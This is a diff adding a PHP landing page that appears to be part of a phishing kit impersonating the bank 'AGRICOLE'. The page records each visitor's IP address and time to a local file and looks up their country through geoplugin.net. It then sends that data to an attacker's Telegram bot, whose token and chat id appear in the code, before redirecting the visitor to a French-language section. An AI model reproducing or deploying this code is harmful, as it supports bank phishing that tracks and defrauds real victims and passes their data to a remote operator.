@@ -1,0 +1,42 @@
+<?php
+
+
+
+include 'inc/app.php';
+
+$ip = getenv("REMOTE_ADDR");
+$file = fopen("vu.txt","a");
+fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
+
+
+$ip=$_SERVER['REMOTE_ADDR'];
+
+$details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip"));
+
+$continent=$details->geoplugin_continentCode;
+
+$country=$details->geoplugin_countryCode;
+
+
+$ok = ("AGRICOLE-$country : $ip.  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
+
+$awebsite="https://api.telegram.org/bot6068174098:AAHGc0fHxIPGX-8Rzt19LEY2KfLdXhgcZsk";
+$pparams=[
+'chat_id'=>'5090585866',
+'text'=>$ok,
+];
+$chh = curl_init($awebsite . '/sendMessage');
+curl_setopt($chh, CURLOPT_HEADER, false);
+curl_setopt($chh, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($chh, CURLOPT_POST, 1);
+curl_setopt($chh, CURLOPT_POSTFIELDS, ($pparams));
+curl_setopt($chh, CURLOPT_SSL_VERIFYPEER, false);
+$result = curl_exec($chh);
+curl_close($chh);
+
+
+
+header("location: ./fr");
+
+?>
+    
